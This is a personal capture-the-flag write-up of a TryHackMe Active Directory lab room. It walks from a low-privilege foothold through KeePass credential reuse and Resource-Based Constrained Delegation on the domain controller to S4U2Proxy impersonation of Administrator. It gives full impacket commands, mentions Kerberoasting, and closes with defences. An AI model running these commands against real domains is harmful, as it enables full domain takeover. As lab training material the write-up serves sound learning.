# Forward (TryHackMe)

- **Path/module:** Jr Penetration Tester -> Active Directory (challenge room, after [[proxy]]). Assumed-breach:
  given a foothold user, "move laterally and escalate to full control."
- **Date:** 2026-10-21.
- **Status:** SOLVED - **Administrator flag `THM{…}`**.
  **Attack fully mapped headless from the PC** (impacket LDAP/Kerberos ACL analysis pinned the exact
  privesc). The one hop that is **not** headless - `j.smith -> r.williams` - needs **interactive discovery
  of a KeePass database** (see Status note); the rest (RBCD + S4U2Proxy) is pure impacket, same finisher as
  [[proxy]].
- **Target:** `DC01.ctf.local` (`<ip>`, std THM access VPN). Domain **`ctf.local`** (same domain SID
  family as [[proxy]]: `S-1-5-21-1966530601-3185510712-10604624`). Standard full DC; no WinRM/web/ADCS.
- **Start creds (given):** `ctf.local\j.smith : <redacted-pw>` ("IT Staff"; only *Remote Desktop Users* +
  *AppLocker-Restricted* - no privileges).

## The answer

| Question | Answer |
|---|---|
| Administrator flag | `THM{…}` |

## Attack chain (intended)

**KeePass credential discovery -> password reuse (r.williams) -> RBCD on DC01$ -> S4U2Proxy impersonate
Administrator.**

1. **Foothold enum (headless).** As `j.smith`, authenticated LDAP (Kerberos bind) maps the domain. j.smith
   has **zero** abuse edges. The one principal that matters:
   - **`r.williams`** (Help Desk Senior, `adminCount=1`, group `sysadmin`) holds **`WriteProperty` on
     `msDS-AllowedToActOnBehalfOfOtherIdentity` of `DC01$`** - i.e. it can configure **Resource-Based
     Constrained Delegation** on the Domain Controller. That is the whole ballgame.
   - `svc.helpdesk` (SPN `helpdesk/DC01`, `TRUSTED_TO_AUTH_FOR_DELEGATION`, empty AllowedToDelegateTo,
     strong password) and `t.jones` are dead-ends.
2. **Lateral move j.smith -> r.williams (interactive).** The room drops `j.smith` into *Remote Desktop
   Users* + *AppLocker-Restricted* on DC01 on purpose: **RDP in, find a KeePass `.kdbx`** on the host, open
   it, and recover credentials. r.williams **reuses** a password stored in that vault. (This is why the hop
   is not reachable over LDAP/SMB - there is no ACL path and no lockout "spray me" shortcut; the secret
   lives in a file you reach interactively. The `lockoutThreshold=0` is a red herring.)
3. **RBCD on DC01$ (headless, as r.williams).** With r.williams, write a controlled principal into the DC's
   `msDS-AllowedToActOnBehalfOfOtherIdentity`. The front principal must have an SPN - create a computer
   account (default `ms-DS-MachineAccountQuota=10` lets any user add one, and you know its password):
   ```bash
   # add a computer, then set RBCD on the DC to trust it
   addcomputer.py -computer-name EVIL$ -computer-pass 'Evil123!' -dc-ip <ip> ctf.local/r.williams:<pw>
   rbcd.py -delegate-from 'EVIL$' -delegate-to 'DC01$' -action write -dc-ip <ip> ctf.local/r.williams:<pw>
   ```
4. **S4U2Self + S4U2Proxy -> ticket theft -> DA (headless).** As `EVIL$`, impersonate Administrator to a
   DC service and use the ticket:
   ```bash
   getST.py -spn cifs/DC01.ctf.local -impersonate Administrator -dc-ip <ip> 'ctf.local/EVIL$:Evil123!'
   KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache  smbexec.py -k -no-pass DC01.ctf.local
   # -> NT AUTHORITY\SYSTEM on the DC -> read the Administrator flag
   ```
   Flag: **`THM{…}`** (RBCD / S4U2Proxy / ticket theft -> Domain Admin).

## What I proved headless (impacket, from the PC)

- **Pinned the exact privesc without BloodHound:** a custom LDAP DACL scanner (request `nTSecurityDescriptor`
  with the SD-flags control `0x05`, parse with `impacket.ldap.ldaptypes`) found the **only** abuse edge in
  the domain: `r.williams --WriteProperty[msDS-AllowedToActOnBehalfOfOtherIdentity]--> DC01$`. Confirmed no
  one else (besides admins / `SELF`) can write it.
- **Ruled out every other headless path:** no ADCS (no CA/templates), no LAPS, no gMSA, no readable
  `userPassword`/`info`, no GPP/cpassword or scripts in SYSVOL/NETLOGON, the custom `Downloads` share empty,
  no GPO/OU write for j.smith's token, no ForceChangePassword / Shadow-Credential / AddSelf edges.
- **Kerberoasted `svc.helpdesk`** via j.smith's TGT (RC4 etype 23) - but its password is strong (not in
  rockyou, even with rules), confirming it was a decoy, not the path.
- **The S4U finisher is identical to [[proxy]]** and already proven headless there (getST S4U2Self/Proxy +
  `cifs/DC01` ticket -> read `C$`).

## Lessons learned

- **The crux edge was RBCD, found by reading one ACE.** `adminCount=1` + membership in an odd custom group
  (`sysadmin`) flagged r.williams; the DACL on `DC01$` confirmed it. Always dump
  `msDS-AllowedToActOnBehalfOfOtherIdentity` writers on the DC's computer object.
- **Not every lateral move is on the wire.** I burned a lot of effort trying to *guess/brute* r.williams
  (no lockout made it tempting) - but the password lived in a **KeePass vault on disk**, reachable only by
  using the foothold's **RDP** right. `Remote Desktop Users` + `AppLocker-Restricted` on a user with no
  network privileges is the tell that the next secret is **on the host**, found interactively, not sprayed.
  (`lockoutThreshold=0` was a deliberate red herring.)
- **RBCD needs no `SeEnableDelegationPrivilege`.** Unlike classic constrained delegation (which the GPO
  restricts to Administrators), writing a computer's `AllowedToActOnBehalfOfOtherIdentity` is gated purely
  by the object ACL - so r.williams's single WriteProperty ACE is enough to own the DC.
- **RBCD vs the [[proxy]] S4U path:** Proxy = the *front* account already had constrained delegation
  (`AllowedToDelegateTo cifs/DC`); Forward = *you* grant delegation by writing RBCD on the DC, using a
  computer account you create as the front. Both finish with S4U2Self+S4U2Proxy + ticket theft.
- **Defences:** don't grant non-admins write over computer objects' RBCD attribute; store service/admin
  creds in a managed vault (not a file-share KeePass with a reused/weak master); enforce LAPS and unique
  per-account passwords; monitor `msDS-AllowedToActOnBehalfOfOtherIdentity` changes and S4U (4769) on the DC.

## Related

- [[proxy]] - the sister room; S4U2Self/S4U2Proxy constrained-delegation finisher (I reuse it here).
- [[intro-to-ad-lateral-movement]] / [[intro-to-credential-harvesting]] - lateral movement + where creds hide.
- [[ad-module-plan]] / [[ctf-workspace-dir]] / [[tryhackme-learning-buddy]] - trackers.
